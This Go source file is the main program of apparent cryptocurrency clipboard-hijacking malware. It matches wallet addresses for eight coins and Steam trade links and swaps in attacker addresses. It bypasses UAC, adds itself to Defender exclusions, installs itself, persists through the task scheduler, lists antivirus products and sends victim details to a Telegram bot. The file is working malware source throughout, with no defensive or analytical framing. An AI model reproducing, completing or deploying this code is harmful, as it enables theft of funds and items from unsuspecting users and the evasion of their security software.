package main

import (
	"fmt"
	"os/user"
	"regexp"
	"strings"
	"syscall"

	"clipper/src/antivirus"
	"clipper/src/autorun"
	"clipper/src/clipper"
	"clipper/src/defender"
	"clipper/src/geoblock"
	"clipper/src/install"
	"clipper/src/telegram"
	"clipper/src/uac"
	"clipper/src/utils"
)

var (
	btcRegex     = regexp.MustCompile(`^(?:bc1[ac-hj-np-z02-9]{25,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$`)
	ethRegex     = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	ltcRegex     = regexp.MustCompile(`^(?:ltc1[ac-hj-np-z02-9]{39,59}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,34})$`)
	dogeRegex    = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$`)
	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
	xmrRegex     = regexp.MustCompile(`^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$`)
	
	steamTradeRegex = regexp.MustCompile(`(https?:\/\/)?steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+(&token=[\w\-]+)?`)
)

var (
	BtcAddr     string
	EthAddr     string
	LtcAddr     string
	DogeAddr    string
	TonAddr     string
	UsdtTrcAddr string
	SolAddr     string
	XmrAddr     string
	SteamAddr   string
)

var (
	bot_token   string
	chat_id     string
	blockedGeos string
)

// behavior settings
var (
	installSelf 		string
	defenderExcluder	string
	autoStart 			string
	uacBypass			string
)

var matchers = []clipper.Matcher{
	{Regex: btcRegex, Addr: BtcAddr},
	{Regex: ethRegex, Addr: EthAddr},
	{Regex: ltcRegex, Addr: LtcAddr},
	{Regex: dogeRegex, Addr: DogeAddr},
	{Regex: tonRegex, Addr: TonAddr},
	{Regex: usdttrcRegex, Addr: UsdtTrcAddr},
	{Regex: solRegex, Addr: SolAddr},
	{Regex: xmrRegex, Addr: XmrAddr},
	{Regex: steamTradeRegex, Addr: SteamAddr},
}

func main() {
	// get self path and name
	selfPath, _ := utils.GetSelfPath()
	selfName, _ := utils.GetSelfName()

	installEnabled := installSelf == "true"
	defenderEnabled := defenderExcluder == "true"
	autostartEnabled := autoStart == "true"
	uacBypassEnabled := uacBypass == "true"

	if !utils.IsElevated() {
		if uacBypassEnabled {
			uac.RunBypassUAC() // UAC bypass + runas admin if bypass failed
		} else {
			uac.RunDefaultUAC() // default runas admin
		}
	}
	
	// run installation if enabled
	if installEnabled {
		install.InstallSelf()
	}

	// add to Defender exclusions if enabled
	if defenderEnabled {
		_ = defender.ExcludeFromDefender(selfPath)
	}

	// we checking geo block
	geo := utils.GetGeo()
	geoblock.GeoBlock(blockedGeos, geo)

	user, _ := user.Current()
	pid := syscall.Getpid()
	uac := utils.IsElevated()
	username := user.Username

	// get installed antiviruses
	antiviruses := antivirus.GetInstalledAntiviruses()
	avList := "none"
	if len(antiviruses) > 0 {
		avList = strings.Join(antiviruses, ", ")
	}

	// send start log to telegram
	telegram.SendLog(fmt.Sprintf(
		"🟢 %s / %s\n" +
		"<code>%s</code>\n" +
		"PID: <code>%d</code>\n" +
		"UAC: <code>%t</code>\n" +
		"AV: <code>%s</code>\n",
		username,
		geo,
		selfPath,
		pid,
		uac,
		avList,
	), chat_id, bot_token)

	// add to autostart if enabled
	if autostartEnabled {
		_ = autorun.AddToSchelduler(selfPath, selfName)
	}

	// we starting main clipper process
	clipper.StartClipper(chat_id, bot_token, matchers, user.Username)

	select {}
}